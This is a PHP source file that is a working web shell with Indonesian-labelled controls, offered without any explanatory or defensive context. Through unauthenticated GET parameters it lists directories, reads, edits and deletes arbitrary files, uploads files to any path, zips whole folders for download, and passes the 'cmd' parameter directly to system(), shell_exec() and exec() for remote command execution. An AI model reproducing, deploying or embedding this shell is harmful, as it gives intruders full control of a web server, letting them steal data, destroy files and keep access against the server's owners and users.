<?php

$urlParams = explode('/', $_SERVER['REQUEST_URI']);
$protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,strpos( $_SERVER["SERVER_PROTOCOL"],'/'))).'://';
	
$actual_link = $protocol.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];

if (!isset($_GET['p'])){
	//echo 'a';
}else{
	$prmt=$_GET['p'];
	$vpath=$_GET['v'];
	if ($prmt === 'lsdir'){
		echo '<html><body><table border="1" cellpadding="7"><tr><th>Folder/Filename</th><th>Folder</th><th>Size</th><th>Permission</th><th>Last Update</th><th>Read</th><th>Edit</th><th>Hapus</th><th>Backup</th><th>Zip Linux</th></tr>';
		lsdir($vpath);
	}else if($prmt === 'lhtfile'){
		lhtfile($vpath);
	}else if($prmt === 'efile'){
		efile($vpath);
	}else if($prmt === 'wwfile'){
		wrtfile3($vpath);
	}else if($prmt === 'dfile'){
		dfile($vpath);
	}else if($prmt === 'gfile'){
		gfile($vpath);
	}else if($prmt === 'gfilez'){
		gfilez($vpath);
	}else if($prmt === 'dwdir'){
		dwdir($vpath);
	}else if($prmt === 'xzip'){
		$vpath2=$_GET['h'];
		xzip($vpath,$vpath2);
	}else if($prmt === 'wzip'){
		$vpath2=$_GET['h'];
		zipData($vpath,$vpath2);
	}else if($prmt === 'zzip'){
		$vpath2=$_GET['h'];
		$jenis=$_GET['g'];
		zzipData($vpath,$vpath2,$jenis);
	}else if($prmt === 'inn'){
		includex();
	}else if($prmt === 'inn2'){
		includex2();
	}else if($prmt === 'inn3'){
		includex3();
	}else if($prmt === 'ufile'){
		fileu2();
	}
	

}

function fileu2(){
	$protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,strpos( $_SERVER["SERVER_PROTOCOL"],'/'))).'://';
	
	$actual_link = $protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$urlParams = explode('/', $_SERVER['REQUEST_URI']);
	$self = $_SERVER["PHP_SELF"];

	$docr = $_SERVER["DOCUMENT_ROOT"];
	$sern = $_SERVER["SERVER_NAME"];
	$tend = "</tr></form></table><br><br><br><br>";
	if (!empty($_GET["ac"])) {
		$ac = $_GET["ac"];
	} elseif (!empty($_POST["ac"])) {
		$ac = $_POST["ac"];
	} else {
		$ac = "upload";
	} 
	switch($ac) {
		case "upload":
			echo '<table><form enctype="multipart/form-data" action="'.$actual_link.'" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td><tr><td><input size="10" value="'.$docr.'/" name="path" type="text"><input type="submit" value="??">submit</td>'.$tend.'HTML';if (isset($_POST['path'])){$uploadfile = $_POST['path'].$_FILES['file']['name'];if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}if (copy($_FILES['file']['tmp_name'], $uploadfile)) {echo "File  ".$_FILES['file']['name']."  uploaded";} else {    print "Not working: info:";    print_r($_FILES);}}break;}
}

function dfile($filed){
	unlink($filed);
}
function gfile($fileg){
	
	if (file_exists($fileg)) {
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.basename($fileg).'"');
		header('Expires: 0');
		header('Cache-Control: must-revalidate');
		header('Pragma: public');
		header('Content-Length: ' . filesize($fileg));
		readfile($fileg);
		exit();
	}
}

function gfilez($filepath,$filename){
	

	$filex=$filepath.'/'.$filename;

	if (file_exists($filex)) {
	ob_start();
	//$filename = "new.zip";
	//
	// http headers for zip downloads
	header("Pragma: public");
	header("Expires: 0");
	header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
	header("Cache-Control: public");
	header("Content-Description: File Transfer");
	header("Content-type: application/zip");
	header("Content-Disposition: attachment; filename=\"".$filename."\"");
	header("Content-Transfer-Encoding: binary");
	header("Content-Length: ".filesize($filepath.'/'.$filename)+150);
	ob_end_clean();
	readfile($filepath.'/'.$filename);
	//unlink($filex);
	exit();
	}
	
}




function dwdir($dir){
	$zip = new ZipArchive();
	$fxname=str_replace(":","",str_replace("/","_",$dir)).'.zip';
	$filename = $dir."/".$fxname;
	
	if ($zip->open($filename, ZipArchive::CREATE)!==TRUE) {
		exit("cannot open <$filename>\n");
	}
	//$zip->addFile('index.php');

	$files1 = array_diff(scandir($dir),array('..','.'));
	//'chome'
	FOREACH($files1 AS $files){
		$html1 = $html1.'<tr>';
		//echo '<tr>';
		
		//$ary1=explode('.',$files);
		$ary1=substr($files, strrpos($files, '.')+1);
		//echo $ary1;
		if ($files === '.' || $files === '..' || is_dir($files) || $ary1 == 'png' || $ary1 == 'jpg' || $ary1 == 'jpeg' || $files == $fxname || $files==='index2.php' ){
			//echo 'a';
		}else{
			
				//echo '<td>'.$dir.'/'.$files.'</td>';
				//$html1 = $html1.'<td>'.$dir.'/'.$files.'</td>';
				$zip->addFile($files);
			
		}
		
		$html1 = $html1.'</tr>';
		/*
		if (is_file($files)){
			echo 'filename '+$files;
		}
		*/
	}
	$html1 =$html1.'</body></html>';
	//echo $html1;
	//die();
	$zip->close();
	gfilez($dir,$fxname);

}

function lhtfile($bacafile){

	//echo file_get_contents($bacafile);
	/*
	$myfile= fopen($bacafile,'w+');
	$txt = '<?$x=2;echo $x?>';
	fwrite($myfile, $txt);
	fclose($myfile);
	*/

	$myfile = fopen($bacafile, "r") or die("Unable to open file!");
	$isifile= fread($myfile,filesize($bacafile));
	echo "<textarea name='html' style='width:100%' >" . htmlspecialchars($isifile) . "</textarea>".'<a href="'.$actual_link.'?p=efile&v='.$bacafile.'">Write';
	
	fclose($myfile);
	
	//echo $x;
	//show_source($bacafile);
	//echo file_get_contents($bacafile);

	
}

function wrtfile2($bacafile){
	$myfile= fopen($bacafile,'w+');
	$txt = '<?$x=2;echo $x?>';
	$mfile= $_GET['p'];
	fwrite($myfile, '');
	fclose($myfile);
	
}

function wrtfile3($bacafile){
	$myfile= fopen($bacafile,'w+');
	fwrite($myfile, '');
	fclose($myfile);
	
}

function wrtfile($bacafile){
	$myfile= fopen($bacafile,'w+');
	$txt = '<?$x=2;echo $x?>';
	$mfile= $_GET['p'];
	//fwrite($myfile, $mfile);
	//fclose($myfile);
	
}

function lsdir($dir){

	//$zip->addFile('index.php');
	$urlParams = explode('/', $_SERVER['REQUEST_URI']);
	//$actual_link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	$protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,strpos( $_SERVER["SERVER_PROTOCOL"],'/'))).'://';
	
	$actual_link = $protocol.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	$files1 = array_diff(scandir($dir),array('..','.'));
	$html1 = '<html><body>';
	FOREACH($files1 AS $files){
		if (strrpos($files, '.')>0){
			$ary1=substr($files, strrpos($files, '.')+1);
		}else{
			$ary1=$files;
		}
		//echo $files.filesize($dir.'/'.$files);
		
		if ($ary1!='sys'){
			$size = filesize($dir.'/'.$files) / 1024;
			$size = round($size, 3);
			if ($size >= 1024) {
				$size = round($size / 1024, 2) . ' MB';
				if ($size >= 1024) {
					$size = round($size / 1024, 2) . ' GB';
				}
			} else {
				$size = $size . ' KB';
			}
			$perm=perms($dir.'/'.$files);
			$lastupdate=date("d-M-Y H:i", filemtime($dir.'/'.$files));
		}else{
			$size='0 KB';
			$perm='--';
			$lastupdate='';
		}
		if (is_dir($files)){
			$html1 = $html1.'<tr><td><a href="'.$actual_link.'?p=dwdir&v='.$dir.'/'.$files.'">'.$dir.'/'.$files.'</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=lsdir&v='.$dir.'/'.$files.'">Open Folder</td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td>'.$perm.'</td>';
			$html1 = $html1.'<td>'.$lastupdate.'</td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=xzip&v='.$dir.'/'.$files.'&h='.$dir.'/'.$files.'/'.$files.'ok.zip">Backup</td>';
			
			$html1 = $html1."<td><a href='".$actual_link.'?p=inn&v=&cmd=zip -r "'.$dir.'/'.$files.'ok1.zip" "'.$dir.'/'.$files.'"'."'>Zip</td></tr>";
		
		}else if ((is_file($files) || $ary1 == 'php') && isset($ary1)){
			
			$html1 = $html1.'<tr><td><a href="'.$actual_link.'?p=gfile&v='.$dir.'/'.$files.'">'.$dir.'/'.$files.'</td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td>'.$size.'</td>';
			$html1 = $html1.'<td>'.$perm.'</td>';
			$html1 = $html1.'<td>'.$lastupdate.'</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=lhtfile&v='.$dir.'/'.$files.'">Read</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=lhtfile&v='.$dir.'/'.$files.'">Write</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=dfile&v='.$dir.'/'.$files.'">Hapus</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=xzip&v='.$dir.'/'.$files.'&h='.$dir.'/'.$files.'/'.$files.'ok.zip">Backup</td>';
			$html1 = $html1."<td><a href='".$actual_link.'?p=inn&v=&cmd=zip -r "'.$dir.'/'.$files.'ok1.zip" "'.$dir.'/'.$files.'"'."'>Zip</td></tr>";
		
		}else if (isset($ary1) && $ary1 != $files){
			$html1 = $html1.'<tr><td><a href="'.$actual_link.'?p=gfile&v='.$dir.'/'.$files.'">'.$dir.'/'.$files.'</td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td>'.$size.'</td>';
			$html1 = $html1.'<td>'.$perm.'</td>';
			$html1 = $html1.'<td>'.$lastupdate.'</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=lhtfile&v='.$dir.'/'.$files.'">Read</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=lhtfile&v='.$dir.'/'.$files.'">Write</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=dfile&v='.$dir.'/'.$files.'">Hapus</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=xzip&v='.$dir.'/'.$files.'&h='.$dir.'/'.$files.'/'.$files.'ok.zip">Backup</td>';
			$html1 = $html1."<td><a href='".$actual_link.'?p=inn&v=&cmd=zip -r "'.$dir.'/'.$files.'ok1.zip" "'.$dir.'/'.$files.'"'."'>Zip</td></tr>";
		
		}else{

			$html1 = $html1.'<tr><td><a href="'.$actual_link.'?p=lsdir&v='.$dir.'/'.$files.'">'.$dir.'/'.$files.'</td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=lsdir&v='.$dir.'/'.$files.'">Open Folder</td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td>'.$perm.'</td>';
			$html1 = $html1.'<td>'.$lastupdate.'</td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td></td>';
			$html1 = $html1.'<td><a href="'.$actual_link.'?p=xzip&v='.$dir.'/'.$files.'&h='.$dir.'/'.$files.'/'.$files.'ok.zip">Backup</td>';
			$html1 = $html1."<td><a href='".$actual_link.'?p=inn&v=&cmd=zip -r "'.$dir.'/'.$files.'ok1.zip" "'.$dir.'/'.$files.'"'."'>Zip</td></tr>";
		
		}
	
		
	}
	$html1 = $html1.'</body></html>';
	echo $html1;
}
function xzip($source, $destination) {
	if (extension_loaded('zip')) {
		if (file_exists($source)) {
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
				$source = realpath($source);
				if (is_dir($source)) {
					$iterator = new RecursiveDirectoryIterator($source);
					// skip dot files while iterating 
					$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
					$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file) {
						$file = realpath($file);
						if (is_dir($file)) {
							$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
							
						} else if (is_file($file)) {
							
							$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
						}
					}
				} else if (is_file($source)) {
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return $zip->close();
			//gfilez($dir,$destination);
		}
	}
	return false;
    
}

FUNCTION includex(){
	echo system($_GET["cmd"]);
}
FUNCTION includex2(){
	echo shell_exec($_GET["cmd"]);
}

FUNCTION includex3(){
	echo exec($_GET["cmd"]);
}
function xzipData($source, $destination) {
if (extension_loaded('zip')) {
if (file_exists($source)) {
$zip = new ZipArchive();
if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
$source = realpath($source);
if (is_dir($source)) {
$iterator = new RecursiveDirectoryIterator($source);
// skip dot files while iterating
$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
foreach ($files as $file) {
$file = realpath($file);
if (is_dir($file)) {
$zip->addEmptyDir(str_replace($source . '', '', $file . ''));
} else if (is_file($file)) {
$zip->addFromString(str_replace($source . '', '', $file), file_get_contents($file));
}
}
} else if (is_file($source)) {
$zip->addFromString(basename($source), file_get_contents($source));
}
}
return $zip->close();
}
}
return false;
}

function zipData($source, $destination) {
	echo 'a1';
	if (extension_loaded('zip')) {
		echo 'a';
		if (file_exists($source)) {
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
				$source = realpath($source);
				if (is_dir($source)) {
					$iterator = new RecursiveDirectoryIterator($source);
					// skip dot files while iterating 
					$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
					$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file) {
						$file = realpath($file);
						if (is_dir($file)) {
							$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
							
						} else if (is_file($file)) {
							$path_parts = pathinfo($file);
							if ($path_parts['extension']=='php'){
								$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
							}
							
						}
					}
				} else if (is_file($source)) {
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return $zip->close();
			//gfilez($dir,$destination);
		}
	}else{
		echo 'no ext zip';
	}
	return false;
    
}

function zzipData($source, $destination,$jenis) {
	if (extension_loaded('zip')) {
		if (file_exists($source)) {
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
				$source = realpath($source);
				if (is_dir($source)) {
					$iterator = new RecursiveDirectoryIterator($source);
					// skip dot files while iterating 
					$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
					$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file) {
						$file = realpath($file);
						if (is_dir($file)) {
							$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
							
						} else if (is_file($file)) {
							$path_parts = pathinfo($file);
							if ($path_parts['extension']==$jenis){
								$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
							}
							
						}
					}
				} else if (is_file($source)) {
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return $zip->close();
			//gfilez($dir,$destination);
		}
	}
	return false;
    
}

function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>